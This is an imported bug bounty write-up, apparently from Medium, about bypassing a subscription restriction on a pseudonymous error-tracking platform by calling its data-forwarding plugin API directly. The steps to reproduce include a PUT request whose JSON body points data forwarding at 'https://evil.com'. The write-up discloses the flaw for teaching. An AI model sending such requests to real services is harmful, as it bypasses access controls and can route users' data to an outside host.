---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-04_how-i-earned-469-bounty-bypassing-plan-restriction.md
original_filename: 2024-08-04_how-i-earned-469-bounty-bypassing-plan-restriction.md
title: 'How I Earned $469 Bounty: Bypassing Plan Restriction'
category: documents
detected_topics:
- access-control
- command-injection
- otp
- api-security
tags:
- imported
- documents
- access-control
- command-injection
- otp
- api-security
language: en
raw_sha256: 93b634ca71a59895f1a75ad5bdbc1adedc7ca66a19d9b07bb4ba8763237d0d13
text_sha256: 4ed6f13d6e98f8f5a9e64521ea37e4bb1412277eec48dac2a10e8058df4d30a4
ingested_at: '2026-06-28T07:32:36Z'
sensitivity: unknown
redactions_applied: false
---

# How I Earned $469 Bounty: Bypassing Plan Restriction

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-04_how-i-earned-469-bounty-bypassing-plan-restriction.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:36Z
- Redactions Applied: False
- Raw SHA256: `93b634ca71a59895f1a75ad5bdbc1adedc7ca66a19d9b07bb4ba8763237d0d13`
- Text SHA256: `4ed6f13d6e98f8f5a9e64521ea37e4bb1412277eec48dac2a10e8058df4d30a4`


## Content

---
title: "How I Earned $469 Bounty: Bypassing Plan Restriction"
url: "https://medium.com/@a13h1/how-i-earned-469-bounty-bypassing-plan-restriction-58f6d3120b6e"
authors: ["Abhi Sharma (@a13h1_)"]
bugs: ["Privilege escalation", "Broken Access Control"]
bounty: "469"
publication_date: "2024-08-04"
added_date: "2024-08-06"
source: "pentester.land/writeups.json"
original_index: 109
scraped_via: "browseros"
---

# How I Earned $469 Bounty: Bypassing Plan Restriction

Top highlight

How I Earned $469 Bounty: Bypassing Plan Restriction
Abhi Sharma
Follow
2 min read
·
Aug 3, 2024

370

5

Hi Everyone, Today, I’m excited to share insights into a security vulnerability I uncovered in ExamenTry (a pseudonym for confidentiality), which allowed free-tier users to access data forwarding settings typically restricted to higher subscription plans. This discovery earned me a $469 bounty.

Press enter or click to view image in full size

Understanding the Target: ExamenTry

ExamenTry is a renowned platform for error tracking and monitoring, crucial for developers to maintain application stability and performance.

The Flaw

Normally, access to data forwarding settings on ExamenTry requires a subscription to higher-tier plans. However, I identified a flaw that allowed free-tier users to bypass this restriction. By manipulating the project’s settings through a crafted API request, users could gain unauthorized access to features intended for paying subscribers.

Steps To Reproduce
Log in with a free-tier account on ExamenTry.
Accessing the data forwarding setting require paid trail if we go though U.I but
Access the data forwarding settings for a project using the following link or API request bypass the restrictions :
Because sometimes coders restrict the paid feature through U.I they thing if user doesn't have U.I Access or we are not showing the feature on U.I dashboard how they can access that feature.
So in examtry i crafted the URL and API which allow me to access the data forwarding
Link: https://yoursubdomain.examentry.io/settings/projects/projectname/plugins/splunk/
API Request:
PUT /api/0/projects/dd-0n/nodecf/plugins/splunk/ HTTP/2
Host: us.examentry.io
...
{"instance":"https://evil.com","index":"mains","source":"examentry","token":"fdvfdvdfsvdfvdf"}
By using the above url or api the free-tier user gains unauthorized access to the data forwarding settings.

Impact

This vulnerability poses a significant risk as it allows free-tier users to access features restricted to higher subscription levels. This can lead to unauthorized data exposure and potential misuse, impacting the confidentiality and integrity of the system.

Response and Reward

Upon reporting the issue, the ExamenTry security team promptly acknowledged and triaged the vulnerability. Paid me 469$ in Bounty.

Takeaway

This discovery underscores the critical importance of robust access controls and thorough security testing in software applications. Even seemingly minor misconfigurations can lead to significant security vulnerabilities.

Support and Follow

If you found this write-up insightful, please leave a clap and share your feedback in the comments. Follow me for more exciting findings and cybersecurity tips!

Get Abhi Sharma’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Find me on Twitter: @a13h1_

Thank you for your continued support. Keep clapping, commenting, and sharing your thoughts!
